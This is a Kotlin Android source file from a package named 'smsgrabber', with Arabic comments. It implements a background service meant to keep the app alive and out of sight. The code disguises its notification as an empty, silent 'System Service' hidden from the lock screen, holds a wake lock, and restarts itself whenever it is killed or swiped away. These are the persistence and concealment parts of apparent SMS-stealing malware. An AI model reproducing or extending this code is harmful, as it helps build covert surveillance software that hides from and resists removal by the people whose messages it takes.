package com.smsgrabber

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat

/**
 * خدمة خلفية مستمرة - تمنع الأندرويد من قتل التطبيق
 */
class HideService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // إعادة تشغيل الخدمة إذا قتلها النظام
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundNotification() {
        val channelId = "service_channel"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Service",
                NotificationManager.IMPORTANCE_MIN  // أقل أهمية = بدون صوت
            ).apply {
                description = "System background service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء من الشاشة المقفلة
            .build()

        startForeground(9999, notification)
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "SMS-Grabber::WakeLock"
        ).apply {
            acquire(10 * 60 * 1000L) // 10 دقائق
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // عند إزالة التطبيق من المهام الحديثة - أعد تشغيله
        val restartIntent = Intent(applicationContext, HideService::class.java)
        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startService(restartIntent)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        wakeLock?.let {
            if (it.isHeld) it.release()
        }
        // إعادة تشغيل الخدمة إذا قُتلت
        val restartIntent = Intent(applicationContext, HideService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent)
        } else {
            startService(restartIntent)
        }
        super.onDestroy()
    }
}
